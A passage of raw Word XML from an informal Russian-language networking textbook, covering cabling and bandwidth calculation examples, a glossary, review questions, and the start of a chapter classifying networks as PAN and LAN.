        <w:t>**Витая пара Cat6a** — до 10 Гбит/с на расстоянии **до 100 м**. У нас 60 м → **подходит**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптоволокно OM3** — до 10 Гбит/с на расстоянии **до 300 м**. У нас 60 м → **подходит**, но дороже.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Берём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cat6a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (дешевле) или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оптоволокно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (быстрее и на будущее).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Расчёт пропускной способности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: В доме 5 человек. Каждый смотрит 4K-видео на Netflix (требует ~25 Мбит/с). Какая минимальная скорость интернета нужна?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Скорость} = 5 \times 25 = 125 \text{ Мбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">С учётом </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>накладных расходов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (протоколы, пинг, потери) добавь 20-30%:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>125 \times 1.3 = 162.5 \text{ Мбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Подключай тариф </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>200 Мбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (с запасом).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Расчёт задержки в оптоволокне</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Оптоволоконный кабель длиной 50 км соединяет два города. Скорость света в оптоволокне ~200,000 км/с. Какова минимальная задержка?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Задержка} = \frac{\text{Расстояние}}{\text{Скорость света}} = \frac{50 \text{ км}}{200,000 \text{ км/с}} = 0.00025 \text{ с} = 0.25 \text{ мс}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Минимальная задержка </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>0.25 мс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (только время распространения света, без учёта обработки в маршрутизаторах).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Сравнение Wi-Fi 5 ГГц и 2.4 ГГц</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Твой роутер поддерживает обе частоты. К какой подключаться?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Параметр       | 2.4 ГГц               | 5 ГГц                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------------|-----------------------|-----------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Скорость       | до 600 Мбит/с (802.11n) | до 3.5 Гбит/с (802.11ac) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Дальность      | ~50 м в помещении     | ~30 м в помещении     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Помехи         | Много (соседи, микроволновки) | Меньше (больше каналов) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Проникновение  | Лучше через стены     | Хуже через стены      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если ты **рядом с роутером** и нужна **скорость** → **5 ГГц**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если ты **далеко** или **через стены** → **2.4 ГГц**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Расчёт максимальной длины сегмента витой пары</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Свитч на 1 этаже, компьютер на 3 этаже (высота этажа 4 м, по горизонтали ещё 30 м). Можно ли использовать один кабель Cat6?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Длина кабеля} = 2 \times 4 + 30 = 8 + 30 = 38 \text{ м}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Максимальная длина витой пары — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 м</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. У нас </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>38 м</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>можно</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Один кабель Cat6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>подходит</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NIC (Network Interface Card)** — сетевая карта, устройство для подключения компьютера к сети.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MAC-адрес** — уникальный идентификатор сетевой карты (48 бит).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Репитер** — устройство для усиления сигнала.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хаб (Hub)** — устройство, которое пересылает пакеты **всем** портам (устарело).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коммутатор (Switch)** — устройство, которое пересылает пакеты **только** нужному порту (Layer 2, работает с MAC-адресами).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Маршрутизатор (Router)** — устройство для соединения сетей и выбора маршрута (Layer 3, работает с IP-адресами).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Точка доступа (Access Point)** — устройство для создания Wi-Fi сети.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модем** — устройство для преобразования цифровых сигналов в аналоговые и обратно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Витая пара (Twisted Pair)** — кабель из 4 пар скрученных проводов. Категории: Cat5e, Cat6, Cat6a, Cat7, Cat8.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UTP** — неэкранированная витая пара.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**STP** — экранированная витая пара.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптоволокно (Fiber Optic)** — среда передачи данных с помощью света. Типы: одномодовое (SMF) и многомодовое (MMF).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bandwidth** — пропускная способность канала (Мбит/с, Гбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Latency (Ping)** — задержка передачи пакета (мс).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Throughput** — реальная скорость передачи данных с учётом потерь.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Full-duplex** — одновременная передача и приём данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Half-duplex** — либо передача, либо приём (по очереди).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коллизия** — ситуация, когда два устройства передают данные одновременно, и пакеты сталкиваются.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**802.11** — семейство стандартов Wi-Fi (a/b/g/n/ac/ax).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MIMO (Multiple Input Multiple Output)** — технология использования нескольких антенн для увеличения скорости и надёжности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается коммутатор (Switch) от маршрутизатора (Router)?** Приведи пример, когда нужен каждый из них.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему хабы (Hub) практически исчезли из современных сетей? Какие у них были проблемы?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Твой домашний роутер поддерживает Wi-Fi на частотах 2.4 ГГц и 5 ГГц. В каких ситуациях лучше использовать каждую частоту?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчётная задача**: Нужно соединить два здания на расстоянии 150 метров. Скорость должна быть 10 Гбит/с. Какие среды передачи данных подойдут? Обоснуй выбор.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое NAT и зачем он нужен в домашнем роутере?** Приведи пример с IP-адресами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем одномодовое оптоволокно отличается от многомодового? Где используется каждое?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчётная задача**: Оптоволоконный кабель длиной 200 км соединяет два города. Скорость света в оптоволокне ~200,000 км/с. Какова минимальная задержка (latency) передачи пакета в одну сторону?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь ты знаешь, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как физически</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> передаются данные в сетях:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройства**: сетевая карта, свитч, роутер, точка доступа — каждое со своей задачей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Среды**: витая пара (Cat5e-Cat8), оптоволокно (одномодовое/многомодовое), Wi-Fi (2.4/5 ГГц), мобильная связь (4G/5G).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Характеристики**: пропускная способность (bandwidth), задержка (latency), помехоустойчивость, дальность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующей главе разберём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>топологию сетей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>классификацию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (LAN, WAN, MAN, PAN). Stay tuned!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.3. Классификация компьютерных сетей. Топология</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: От Bluetooth до интернета — размер имеет значение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, чувак, мы уже прошли адресацию (IP, DNS, URL) и железяки с кабелями (свитчи, роутеры, оптоволокно). Теперь пора разобраться, как вообще </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>классифицируют</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сети и что за хрень такая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>топология</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что, блин, сеть между твоим ноутбуком и Bluetooth-мышкой — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не то же самое</w:t>
      </w:r>
      <w:r>
        <w:t>, что сеть из тысячи серверов в дата-центре Amazon, и уж точно не то же самое, что весь ебучий интернет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Классификация сетей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это деление по </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>размеру</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>назначению</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. А </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это то, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> устройства соединены друг с другом (физически и логически).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Связь с другими главами:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.01 (Адресация)** — IP-адреса для WAN/LAN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.02 (Сетевые компоненты)** — какое железо для какой топологии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.04 (Протоколы)** — TCP/IP для WAN, Ethernet для LAN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.07 (Модель OSI)** — топология работает на уровнях 1-2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Классификация сетей по территориальному охвату</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сети делят по </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>размеру</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — от крохотных (Bluetooth между телефоном и наушниками) до гигантских (весь интернет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1. PAN (Personal Area Network) — персональная сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>для одного человека</w:t>
      </w:r>
      <w:r>
        <w:t>, в радиусе нескольких метров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bluetooth** — наушники, мышки, клавиатуры, фитнес-браслеты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**USB** — кабельное подключение (флешки, принтеры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NFC (Near Field Communication)** — бесконтактная оплата, метки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Zigbee** — умный дом (лампочки Philips Hue, датчики)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дальность</w:t>
      </w:r>
      <w:r>
        <w:t>: 1-10 метров (Bluetooth), до 1 метра (NFC).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты сидишь за ноутом с Bluetooth-мышкой, AirPods в ушах, Apple Watch на руке, iPhone в кармане. Все эти устройства общаются между собой — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PAN</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Скорость</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bluetooth 5.0: до 2 Мбит/с</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>USB 2.0: до 480 Мбит/с</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>USB 3.0: до 5 Гбит/с</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>USB 3.2: до 20 Гбит/с</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>личных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> устройств. Никаких серверов, никакого интернета (ну, разве что через телефон).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2. LAN (Local Area Network) — локальная сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сеть внутри </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одного здания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (дом, офис, школа, университет). Дальность до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1-2 км</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ethernet** (проводная): витая пара Cat5e-Cat8, скорость 1-40 Гбит/с</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Wi-Fi** (беспроводная): 802.11ac/ax, скорость до 9.6 Гбит/с (теоретически)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокая скорость**: 1-10 Гбит/с (обычно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Низкая задержка**: &lt;1 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Малое количество устройств**: от 2 до 1000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Один владелец**: компания, домашняя сеть</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Домашняя сеть**: роутер + 2 компа + 3 смартфона + smart TV + холодильник с Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
